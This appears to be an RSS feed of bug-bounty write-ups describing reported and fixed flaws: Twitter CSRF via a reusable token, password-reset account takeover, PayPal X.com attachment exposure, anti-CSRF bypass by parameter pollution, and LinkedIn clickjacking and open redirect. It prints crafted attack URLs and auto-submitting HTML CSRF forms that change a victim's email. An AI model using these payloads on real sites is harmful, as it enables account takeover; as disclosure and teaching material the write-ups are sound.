So  using these links the attacker can craft his own CSRF payloads by  changing the nid, screen_name, tweet_id, iid, sig, ea_s, ea_e,  ea_u and uid parameters value to attackers profile which can be executed  using GET request on any Twitter account as the Anti-CSRF token  parameter named as Sig and its values can be reused on any other Twitter  account nor it ever expires.<br />
<br />
<br />
Krutarth  found the First one Using which an Attacker can Force any Twitter User  to Follow the Attacker Twitter Profile Via CSRF on twitter main domain.  The other two I have found Using which an Attacker can Force Any Twitter  User to Re-Tweet Attacker Desired Tweets and Make Favourite Attackers  Tweets Via CSRF on twitter main domain.<br />
<br />
<br />
<br />
[B]So here are the Steps to Execute the Attack:<br />
<br />
1. Twitter Follow CSRF[/B]<br />
<br />
<br />
i).  First Change the refsrc, t, nid, screen_name, tweet_id, iid, sig, ea_s,  ea_e, ea_u and uid parameters value to his own profile same parameter  values where ea_u &amp; uid values are same for each users own profiles  an the refsrc, t values were same for each of the users of the site and  where the sig was implemented as a Anti-CSRF Token but it was reusable  again an again on any other users accounts and also it was never getting  expired and then Open the below mentioned CSRF vulnerable Url in any  browser using any twitter account.<br />
<br />
<br />
<br />
<br />
[B]Twitter Follow CSRF(Url Encoding is Must After Following Url [URL]https://twitter.com/i/redirect?url=):[/URL][/B]<br />
<br />
[URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Ffollow%3Fea_u%3D85273509%26ea_e%3D1387571444%26screen_name%3DKrutarthShukla%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail%26sig%3De1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c%26uid%3D85273509%26iid%3D60cfddd3808c47c29f88ec5e3a7f5742%26nid%3D42%2B483%2B20131130%26t%3D1[/URL]<br />
<br />
<br />
<br />
ii).  As this CSRF vulnerable url is executed in any twitter account the  victims will start following the attackers Twitter profile.<br />
<br />
<br />
<br />
[B]2. Twitter Retweet CSRF[/B]<br />
<br />
<br />
i).  First Change the refsrc, t, nid, screen_name, tweet_id, iid, sig, ea_s,  ea_e, ea_u and uid parameters value to his own profile same parameter  values where ea_u &amp; uid values are same for each users own profiles  an the refsrc, t values were same for each of the users of the site and  where the sig was implemented as a Anti-CSRF Token but it was reusable  again an again on any other users accounts and also it was never getting  expired and then Open the below mentioned CSRF vulnerable Url in any  browser using any twitter account.<br />
<br />
<br />
[B]Twitter Re-Tweet CSRF(Url Encoding is Must After Following Url [URL]https://twitter.com/i/redirect?url=):[/URL][/B]<br />
<br />
[URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Fretweet%3Fea_u%3D85273509%26ea_e%3D1396125896%26tweet_id%3D442695320166617088%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail%26t%3D1%26sig%3De1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c%26iid%3D60cfddd3808c47c29f88ec5e3a7f5742%26uid%3D85273509%26nid%3D42%2B483%2B20131130[/URL]<br />
<br />
<br />
ii).  As this CSRF vulnerable url is executed in any twitter account the  victims will start re-tweeting the attacker desired tweets.<br />
<br />
<br />
[B]<br />
3. Twitter Tweet Favourite CSRF[/B]<br />
<br />
<br />
1.  First Change the refsrc, t, nid, screen_name, tweet_id, iid, sig, ea_s,  ea_e, ea_u and uid parameters value to his own profile same parameter  values where ea_u &amp; uid values are same for each users own profiles  an the refsrc, t values were same for each of the users of the site and  where the sig was implemented as a Anti-CSRF Token but it was reusable  again an again on any other users accounts and also it was never getting  expired and then Open the below mentioned CSRF vulnerable Url in any  browser using any twitter account.<br />
<br />
<br />
[B]Twitter Tweet Favourite CSRF(Url Encoding is Must After Following Url [URL]https://twitter.com/i/redirect?url=):[/URL][/B]<br />
<br />
[URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Ffavorite%3Fea_u%3D85273509%26ea_e%3D1396125896%26tweet_id%3D442695320166617088%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail%26t%3D1%26sig%3De1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c%26iid%3D60cfddd3808c47c29f88ec5e3a7f5742%26uid%3D85273509%26nid%3D42%2B483%2B20131130[/URL]<br />
<br />
<br />
2.  As this CSRF vulnerable url is executed in any twitter account the  victims will start Making Attackers Tweets as his favourite tweets.<br />
<br />
<br />
<br />
[B]Twitter Follow Retweet and Tweet Favourite CSRF Vulnerabilities(Quick) POC Video:[/B]<br />
<br />
[video=youtube;Xd8H7njuo54]https://www.youtube.com/watch?v=Xd8H7njuo54[/video]<br />
<br />
<br />
After  some analysis we have found that when all these CSRF's were executing  then they were actually triggering the follow, retweet and favourite  button. But as the request executed after those buttons clicking then  each of those request were containing the Anti-CSRF token which was  properly getting validated on server-side nor resuable an it expires  also but as the attacker was able to successfully force the Twitter  users to click on the button without his permission, so even though the  second request contains Anti-CSRF token cannot prevent this attack.<br />
<br />
<br />
<br />
<br />
<br />
[B]Rootcause:[/B]<br />
<br />
<br />
Sig  token &amp; its value e1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c was  reuseable for all twitter account and it was not expiring ever also get  request was allowed.<br />
<br />
<br />
<br />
[B]Impact:[/B]<br />
<br />
All  Twitter users are vulnerable to this CSRF attack using these  vulnerabilities that Attacker Force Any Twitter User to Follow, Re-Tweet  and Make Favourite Attackers Tweet Via CSRF.<br />
<br />
<br />
<br />
[B]Recommendation:[/B]<br />
<br />
Sig  token &amp; its value c069a14f1b1cca7b763679029fa3a0f4d94d40cd shall  never be reuseable in the attacker own acount and any other twitter  users account.<br />
<br />
<br />
It shall be expired after use and it shall be 1 time useable.<br />
<br />
<br />
It should be generated randomly on each request.<br />
<br />
<br />
Instead of get method PUT method shall be used.<br />
<br />
<br />
<br />
The vulnerabilities were mitigated by Twitter Security Team in 3 weeks.<br />
<br />
<br />
So in this way, one can find CSRF also this way can be used to find same type of  vulnerabilities on different websites.<br />
<br />
<br />
Suggestions and Feedbacks are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2596</guid>
		</item>
		<item>
			<title>Account Takeover Using Password Reset Vulnerability</title>
			<link>http://garage4hackers.com/entry.php?b=1626</link>
			<pubDate>Fri, 07 Mar 2014 10:17:05 GMT</pubDate>
			<description>*Account Takeover Using Password Reset Functionality* 
 
While  researching and working on bug bounties I have found that by using  Password Reset...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[LEFT][B]Account Takeover Using Password Reset Functionality[/B]<br />
[/LEFT]<br />
While  researching and working on bug bounties I have found that by using  Password Reset Functionality, Token &amp; Link we can Takeover all the  users account of a website if that site is vulnerable to this type of  attack. <br />
<br />
<br />
Using  this vulnerability the attacker can modify the email md5 hash to any  victims email  md5 hash to change their password and in this way he can also reset  all passwords of all the accounts and can successfully compromise the  victims account as the password reset link sent to the user includes the  email address md5 hash and also the password reset token can be used  for other users. <br />
<br />
<br />
[LEFT][B]Steps to Execute the Attack:[/B]<br />
<br />
<br />
There was a precondition that an attacker shall now the victims email id md5 hash value.<br />
<br />
<br />
[B]Attackers Email ID: attackeremailid@gmail.com and his password reset link:[/B]<br />
http://testsite.com/reset-password/74o4s384549484c4k4v506t4d5a3e5n5k444j4g5j4o4c553l454h464m474/74q55426l4q5u5m5c4s5l5m5n5t2102fadb4bd021805624f06ea4c8e4d38<br />
<br />
<br />
The 1st part in the password reset Url before [B]'/'[/B] is password reset token and the second part is the md5 hash of the users email id in which the 1st 28 values [B](74q55426l4q5u5m5c4s5l5m5n5t2)[/B]  are same for each users email ids and the remaining last values were  different for each users email id as they were the users email id md5  hash value. So, the attacker can decrypt the email hash values easily  using the online available md5 encrypters and decrypters like:  http://md5decryption.com also sometimes some websites use base 64  encoding(or other encodings) which can also be easily decrypted using  the online available base64 encoders and decoders like:  http://ostermiller.org/calc/encode.html.<br />
<br />
<br />
[B]Attackers Email ID: attackeremailid@gmail.com md5 hash value:[/B]<br />
[/LEFT]<br />
102fadb4bd021805624f06ea4c8e4d38<br />
<br />
<br />
[LEFT][B]Victims Email ID: victimemailid@gmail.com md5 hash value:[/B]<br />
<br />
05ebb8fb6ec39f50d33e19cd5719084d<br />
<br />
<br />
[B]1st 28 values which is same for each users email id hash:[/B]<br />
74q55426l4q5u5m5c4s5l5m5n5t2<br />
<br />
[B]<br />
Crafted Url to Reset the password of the Victims Email ID(i.e account)victimemailid@gmail.com:[/B]<br />
http://testsite.com/reset-<br />
password/74o4s384549484c4k4v506t4d5a3e5n5k444j4g5j4o4c553l454h464m474/74q55426l4q5u5m5c4s5l5m5n5t205ebb8fb6ec39f50d33e19cd5719084d<br />
<br />
<br />
So in this way the attacker can Takeover on any users account.<br />
<br />
                                        <br />
[B]Impact: [/B]<br />
<br />
[/LEFT]<br />
The  token generated for the activation link isn’t re-checked and no  validation is done for associated emailID field, allowing an attacker to  change the value to a known email address md5 hash value and reset  their password. This provides a trivial route for an attacker to gain  access to accounts or cause a  denial of service to users on the  Application.<br />
<br />
[LEFT]<br />
[B]Recommendation:[/B]  <br />
<br />
Input  from the user should be treated as untrusted and re-validated when sent  to the server. The recommended approach is to generate a onetime token  which is linked to the user account, this can be passed with the onetime  random token instead of the email ID hash value and expired once the  password has been reset. Additionally, ensure if the identifier is not  passed that this won’t default to updating all accounts.<br />
<br />
<br />
So  in this way one can Takeover on the victims accounts using the Password  Reset Functionality, Token &amp; Link also this way can be used to find  same type of  vulnerabilities on different websites.<br />
[/LEFT]<br />
 <br />
<br />
Suggestions and Feedbacks are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1626</guid>
		</item>
		<item>
			<title><![CDATA[How I was able to Read & Download Paypals X.com Users Private Email Attachments]]></title>
			<link>http://garage4hackers.com/entry.php?b=1625</link>
			<pubDate>Fri, 07 Mar 2014 08:05:17 GMT</pubDate>
			<description>*Paypals X.com Failure to Restrict Url Access Vulnerability 
 
*  
I want to share one of my finding on Paypals X.com which I have reported to them...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[B][LEFT]Paypals X.com Failure to Restrict Url Access Vulnerability<br />
[/LEFT]<br />
[/B] <br />
[LEFT]I want to share one of my finding on Paypals X.com which I have reported to them in 3 January 2013.<br />
<br />
[/LEFT]<br />
I have found that Paypal X.com following Url [URL]https://www.x.com/sites/default/files/failure_to_restrict_url_vul_for_any_attachments.txt[/URL]  was vulnerable to Failure to Restrict Url Access Vulnerability as the  email Attachments Url can be accessed without Login or Authentication  nor there was any Authorization check or prevention to mitigate this  attack.<br />
<br />
<br />
<br />
[B]Steps to Regenerate the Vulnerability:[/B]<br />
<br />
<br />
1. Create two X.com Users account for testing or for regenerating the vulnerabiltity.<br />
<br />
<br />
2.  Using the 1st(ajaysinghnegi01) user account then I have composed an  email message using the compose feature and attached a file named:  failure to restrict url vul for any attachments.txt and then I have sent  that mail to the 2nd(ajaysinghnegi02) user account.<br />
<br />
<br />
3.  The 2nd user can access that attached file using by logging into his  account and by checking the recieved emails attachment by accessing the  followiing Url  https://www.x.com/sites/default/files/failure_to_restrict_url_vul_for_any_attachments.txt.<br />
<br />
<br />
4.  As this path is same for all email users emails attachments  https://www.x.com/sites/default/files/ so the attacker crafts the Url  from https://www.x.com/sites/default/files/ to  https://www.x.com/sites/default/files/failure_to_restrict_url_vul_for_any_attachments.txt  by adding the file name with the file extention and also he replaced  each space with underscore(_). So he succesfully crafted the failure to  restrict Url  https://www.x.com/sites/default/files/failure_to_restrict_url_vul_for_any_attachments.txt  to access any other X.com users attachments without logging.<br />
<br />
<br />
Failure to Restrict Vulnerable Url(For Regenerating this Vulnerability Open this Url in Any Browser Without Login):<br />
<br />
[URL]https://www.x.com/sites/default/files/failure_to_restrict_url_vul_for_any_attachments.txt[/URL]<br />
<br />
<br />
[CENTER][URL=&quot;http://1.bp.blogspot.com/-yWGtU_P1xYM/UwpB7U3oi1I/AAAAAAAAAOA/LrOSccJJLaw/s1600/X.com+Any+Users+Email+Attachment+Accessing+Downloading+&amp;+Reading+Critical+Failure+to+Restrict+Url+Vulnerability.jpg&quot;][IMG]http://1.bp.blogspot.com/-yWGtU_P1xYM/UwpB7U3oi1I/AAAAAAAAAOA/LrOSccJJLaw/s1600/X.com+Any+Users+Email+Attachment+Accessing+Downloading+&amp;+Reading+Critical+Failure+to+Restrict+Url+Vulnerability.jpg[/IMG][/URL][/CENTER]<br />
<br />
<br />
[B]Impact: [/B]Using this Failure to Restrict Url Access Vulnerability an attacker can  easily Read &amp; Download all the private email attachments  without  logging and all the X.com users were vulnerable to this attack.  <br />
<br />
<br />
<br />
[B]Recommendation:[/B]<br />
<br />
The authentication and authorization policies be role based, to minimize the effort required to maintain these policies.<br />
<br />
<br />
The policies should be highly configurable, in order to minimize any hard coded aspects of the policy.<br />
<br />
<br />
The  enforcement mechanism(s) should deny all access by default, requiring  explicit grants to specific users and roles for access to every page.<br />
<br />
<br />
If the page is involved in a workflow, check to make sure the conditions are in the proper state to allow access. <br />
<br />
<br />
The vulnerability was mitigated by Paypal Security Team within 3 days.<br />
<br />
<br />
<br />
So  in this way I was able to Read &amp; Download Paypals X.com Users  Private Email Attachments also this way can be used to find same type of   vulnerabilities on different websites.<br />
<br />
<br />
Suggestions and Feedbacks are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1625</guid>
		</item>
		<item>
			<title><![CDATA[Account Compromise & Anti CSRF Token Bypass]]></title>
			<link>http://garage4hackers.com/entry.php?b=1624</link>
			<pubDate>Fri, 07 Mar 2014 08:01:53 GMT</pubDate>
			<description><![CDATA[*Account Compromise & Anti CSRF Token Bypass by Chaining Reflected HPP & Stored HPP Vulnerabilities* 
 
 
While  researching and working on bug...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[LEFT][B]Account Compromise &amp; Anti CSRF Token Bypass by Chaining Reflected HPP &amp; Stored HPP Vulnerabilities[/B]<br />
<br />
<br />
While  researching and working on bug bounties I have found that by using  Reflected HTTP Parameter Pollution vulnerability we can bypass Anti-CSRF  token validation and can execute CSRF and after that using the CSRF we  can execute the Stored HPP vulnerabilty and can compromise any victims  account if that site is vulnerable to these attacks.<br />
  <br />
<br />
The  1st challenge was to execute the CSRF attack by bypassing the Anti-CSRF  token validation. I have found that using Reflected HTTP Parameter  Pollution vulnerability we can bypass the CSRF token validation even  when the token is properly getting validated on server-side.<br />
<br />
<br />
The actual  rootcause of this vulnerability existence is that if the Anti-CSRF token  parameter is used 2 times in a request then the 2nd Anti-CSRF token  parameter value(the value will be attacker desired) is getting accepted  and validated on the server-side instead of the 1st Anti-CSRF token. One  more important point is that the if we try to use any other users CSRF  token or old used CSRF token or any random CSRF token value using single  CSRF token parameter then it was getting denied by the server and the  request is getting blocked as the Anti-CSRF token was properly getting  validated on the server-side.<br />
<br />
<br />
The  2nd Challenge was to execute the Stored HTTP Parameter attack by  finding the email parameter name and editing it with attackers email id.  I have found that using CSRF vulnerability we can execute the Stored  HPP vulnerability so using it we can edit the victims account email id  to attackers email id but for that the attacker has to find the email id  parameter name, so to find it the attacker can guess that parameter  name, can fuzz it and can find the parameter name by using the forget  password, reset password or login page Urls. <br />
<br />
<br />
The   actual  rootcause of this vulnerability existence is that if the email id  parameter is added with the attackers email id in the request using the  CSRF vulnerability then the uneditable email id of victims account is  getting edited or changed with the attackers email id.<br />
<br />
<br />
In  this way the attacker can easily change the victims account login email  id and he has to confirm the changed email id by logggin into his email  id and by clicking on the email confirmation link. Once the attackers  email id is confirmed into the victims account, then the attacker can  use the forget password option to reset the victims account password and  after that attacker can change the victims account password and can  compromie his account.<br />
<br />
<br />
<br />
[B]Steps to execute this attack are as following:[/B]<br />
<br />
<br />
<br />
1. First copy the actual form submission request.<br />
<br />
<br />
[B]Actual Form Submission Request with Original Anti-CSRF Token Parameter Value:[/B]<br />
<br />
<br />
[LEFT]&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;/head&gt;<br />
&lt;body onload=document.forms[0].submit();&gt;<br />
&lt;form action=&quot;https://www.site.com/profile/account_information/edit.htm&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;CSRF_Token&quot; value=&quot;l11l1m1m1n2h4n4m6n67ll8m5m43m2nb2m22b2n2babsvxcstta241&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;firstname&quot; value=&quot;ajay&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;lastname&quot; value=&quot;negi&quot; /&gt;<br />
&lt;/form&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
[/LEFT]<br />
<br />
<br />
2. After that add the same Anti-CSRF token parameter name again with any random value as token.<br />
<br />
<br />
<br />
[B]CSRF Token Bypass Via Reflected HPP (Modified Form Submission Request after adding 2nd Anti-CSRF Token Parameter Value):[/B]<br />
<br />
<br />
[LEFT]<br />
&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;/head&gt;<br />
&lt;body onload=document.forms[0].submit();&gt;<br />
&lt;form action=&quot;https://www.site.com/profile/account_information/edit.htm&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;CSRF_Token&quot; value=&quot;l11l1m1m1n2h4n4m6n67ll8m5m43m2nb2m22b2n2babsvxcstta111&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;CSRF_Token&quot; value=&quot;absbsbssgsgsgsgg1g1g1g11g1g12g2g2g2g1gg1g1g1g1gh1hhg1h&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;firstname&quot; value=&quot;ajay&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;lastname&quot; value=&quot;negi&quot; /&gt;<br />
&lt;/form&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
[/LEFT]<br />
<br />
<br />
3. Now add the Email ID parameter value with the attackers email id.<br />
<br />
<br />
4. Then send this crafted CSRF payload code as a link to the victim.<br />
<br />
<br />
5.  As the victim executes that CSRF payload contianing link the victims  account email id will be changed and the attack will recieve an email to  confirm his email after confirming it the attacker can use the forget  password option to reset the and compromise the victims account.<br />
<br />
<br />
<br />
[B]Account  Compromise &amp; Anti CSRF Token Bypass by Chaining Reflected HTTP  Parameter Pollution CSRF &amp; Stored HPP Vulnerabilities (Modified Form  Submission Request after adding 2nd Anti-CSRF Token Parameter Value and  Email Parameter Value):[/B]<br />
<br />
[LEFT]<br />
&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;/head&gt;<br />
&lt;body onload=document.forms[0].submit();&gt;<br />
&lt;form action=&quot;https://www.site.com/profile/account_information/edit.htm&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;CSRF_Token&quot; value=&quot;l11l1m1m1n2h4n4m6n67ll8m5m43m2nb2m22b2n2babsvxcstta111&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;CSRF_Token&quot; value=&quot;absbsbssgsgsgsgg1g1g1g11g1g12g2g2g2g1gg1g1g1g1gh1hhg1h&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;firstname&quot; value=&quot;ajay&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;lastname&quot; value=&quot;negi&quot; /&gt;<br />
&lt;input type=&quot;hidden&quot; name=&quot;EmailID&quot; value=&quot;attackertesting@gmail.com&quot; /&gt;<br />
&lt;/form&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
<br />
[B]Impact:[/B]<br />
[/LEFT]<br />
<br />
Anti-CSRF token validation can be bypassed and uneditable account login email is can be changed. This can lead  to account compromise.<br />
<br />
<br />
[B]Recommendation:[/B]<br />
<br />
<br />
CSRF token shall be properly validated on server-side and put method can  also be used instead of post.<br />
<br />
<br />
Filtering of all incoming sharing requests that include duplicate parameters.<br />
<br />
<br />
So  in this way, using this multiple vulnerabilties chaining one can bypass  Anti-CSRF token validation and can also compromise the victims account  also these techniques can be used to find same type of vulnerabilities  on different websites.<br />
<br />
<br />
Suggestions and Feedbacks are welcome.   <br />
[/LEFT]</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1624</guid>
		</item>
		<item>
			<title><![CDATA[Linkedin's Clickjacking & Open Url Redirection Vulnerabilities]]></title>
			<link>http://garage4hackers.com/entry.php?b=502</link>
			<pubDate>Tue, 09 Oct 2012 11:11:03 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by ajaysinghnegi)--- 
# Vulnerability Title: Secondary Email Addition & Deletion Via Click   Jacking in Linkedin 
# Website...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[QUOTE=ajaysinghnegi;8813]# Vulnerability Title: Secondary Email Addition &amp; Deletion Via Click   Jacking in Linkedin<br />
# Website Link:  [Tried on Indian version]<br />
#  Found on: 06/08/2012<br />
# Author:  Ajay Singh Negi<br />
# Version:  [All language versions would be vulnerable]<br />
# Tested on: [Indian  version]<br />
# Reported On: 07/08/2012<br />
# Status: Fixed<br />
#  Patched On: 10/09/2012<br />
# Public Release: 15/09/2012<br />
<br />
<br />
<br />
[B][U]Summary[/U][/B]<br />
<br />
<br />
A  Clickjacking vulnerability existed on Linkedin that  allowed an attacker to add or delete a secondary email and can also make  existing secondary email as primary email by redressing the manage  email page.<br />
<br />
<br />
[B][U]Details[/U][/B]<br />
<br />
<br />
Linkedin  manage email page (a total of 1 page) was lacking  X-FRAME-OPTIONS in Headers and Frame-busting javascript  measures to  prevent  framing of the pages. So the manage email page could be redressed  to 'click-jack' Linkedin users. Below I have mentioned the vulnerable  Url and also attached the Proof of concept screenshots.<br />
<br />
<br />
<br />
<br />
[B]1.  Click Jacking Vulnerable Url:[/B]<br />
[URL=&quot;http://www.google.com/url?q=https%3A%2F%2Fwww.linkedin.com%2Fsettings%2Fmanage-email%3Fgoback%3D.nas_*1_*1_*1&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGkjluV_mUQz-l0-O4AE2x6J5lKqA&quot;]https://www.linkedin.com/settings/manage-email?goback=.nas_*1_*1_*1[/URL]<br />
<br />
<br />
<br />
<br />
[B]Click  Jacking[/B][B] Vulnerability POC Screenshots:[/B]<br />
<br />
<br />
[CENTER][URL=&quot;http://4.bp.blogspot.com/-5q4B3AZ_w8w/UFS_icRJgWI/AAAAAAAAAKQ/BtjQTxU8bKk/s1600/Linkedin+Secondary+Email+Addition+POC+Step+1.jpg&quot;][IMG]http://4.bp.blogspot.com/-5q4B3AZ_w8w/UFS_icRJgWI/AAAAAAAAAKQ/BtjQTxU8bKk/s640/Linkedin+Secondary+Email+Addition+POC+Step+1.jpg[/IMG][/URL][/CENTER]<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
The redressed  editor page with frame opacity set to 0 so it is invisible  to the user. As the user drags the computer into the trash-bin and  clicks the  Go button, a new secondary email will be added into the Linkedin user's  account.<br />
<br />
<br />
[CENTER][URL=&quot;http://3.bp.blogspot.com/--JExAfrXWhE/UFS_pwfK7qI/AAAAAAAAAKY/Amuu3SgN4-k/s1600/Linkedin+Secondary+Email+Addition+POC+Step+2.jpg&quot;][IMG]http://3.bp.blogspot.com/--JExAfrXWhE/UFS_pwfK7qI/AAAAAAAAAKY/Amuu3SgN4-k/s640/Linkedin+Secondary+Email+Addition+POC+Step+2.jpg[/IMG][/URL]<br />
[/CENTER]<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
With the  frames opacity set to 0.5 you can clearly see the redressed page and  all the background. The computer is actually a text area that  contains the attacker's email address which is selected by default with  the computer image(Using JavaScript), once the Linkedin user drags the  computer he will actually  drag the attackers email address into the add secondary email address  area and when he  will click the go button, the Linkedin user will actually click the  redressed add email address  button and the attackers email will be successfully added in the  Linkedin users account.<br />
<br />
<br />
<br />
<br />
[CENTER][URL=&quot;http://3.bp.blogspot.com/-8TSbGtC9hm8/UFTA5wyr6QI/AAAAAAAAAK4/sZGFP49vFD0/s1600/Linkedin+Secondary+Email+Addition+POC+Step+3.jpg&quot;][IMG]http://3.bp.blogspot.com/-8TSbGtC9hm8/UFTA5wyr6QI/AAAAAAAAAK4/sZGFP49vFD0/s640/Linkedin+Secondary+Email+Addition+POC+Step+3.jpg[/IMG][/URL][/CENTER]<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
Secondary  email added successfully into the Linkedin users account.<br />
<br />
<br />
<br />
<br />
[CENTER][URL=&quot;http://1.bp.blogspot.com/-RPTXjiTbjJ8/UFS_6RKaX8I/AAAAAAAAAKo/q4IrKYLS0Ds/s1600/X-Frame+Header+Missing+Server+Response+Header.jpg&quot;][IMG]http://1.bp.blogspot.com/-RPTXjiTbjJ8/UFS_6RKaX8I/AAAAAAAAAKo/q4IrKYLS0Ds/s640/X-Frame+Header+Missing+Server+Response+Header.jpg[/IMG][/URL]<br />
[/CENTER]<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
No  X-Frame-Options in servers response header.<br />
<br />
<br />
Linkedin  addressed the vulnerability by adding X-FRAME-OPTIONS in header  field which is set to SAMEORIGIN on this page.<br />
<br />
<br />
<br />
<br />
<br />
<br />
# Vulnerability Title: Open Url  Redirection in Linkedin<br />
# Website Link:  [Tried on Indian version]<br />
#  Found on: 05/08/2012<br />
# Author:  Ajay Singh Negi<br />
# Version:  [All language versions would be vulnerable]<br />
# Tested on: [Indian  version]<br />
# Reported On: 06/08/2012<br />
# Status: Fixed<br />
#  Patched On: 07/09/2012<br />
# Public Release: 15/09/2012<br />
<br />
<br />
<br />
[B][U]Summary[/U][/B]<br />
<br />
<br />
Open  Url  Redirection using which an attacker can redirect any Linkedin user to  any  malicious website. Below I have mentioned the vulnerable  Url and also attached the Proof of concept video.<br />
<br />
<br />
[B]Original  Open Url  Redirection Vulnerable Url:[/B]<br />
<br />
<br />
[URL]https://help.linkedin.com/app/utils/log_error/et/0/ec/7/callback/https%3A%2F%2Fhelp.linkedin.com%2Fapp%2Fhome%2Fh%2Fc%2Ffrom_auth%2Ftrue[/URL]<br />
<br />
<br />
<br />
[B]Crafted  Open Url  Redirection Vulnerable Url:[/B]<br />
[URL=&quot;http://www.google.com/url?q=https%3A%2F%2Fhelp.linkedin.com%2Fapp%2Futils%2Flog_error%2Fet%2F0%2Fec%2F7%2Fcallback%2Fhttp%253A%252F%252Fattacker.in&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHwFbje3XOKHpKQ48bGat-sG-MjCQ&quot;]https://help.linkedin.com/app/utils/log_error/et/0/ec/7/callback/http%3A%2F%2Fattacker.in[/URL]<br />
<br />
<br />
  <br />
[B]Open Url  Redirection Vulnerability POC Video:[/B]<br />
<br />
[video=youtube;ELmV6KML-NE]http://www.youtube.com/watch?v=ELmV6KML-NE[/video]<br />
[CENTER] <br />
[/CENTER]<br />
<br />
<br />
<br />
Special Thanks to AMol NAik, Sandeep Kamble and all G4H members.[/QUOTE]</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=502</guid>
		</item>
	</channel>
</rss>
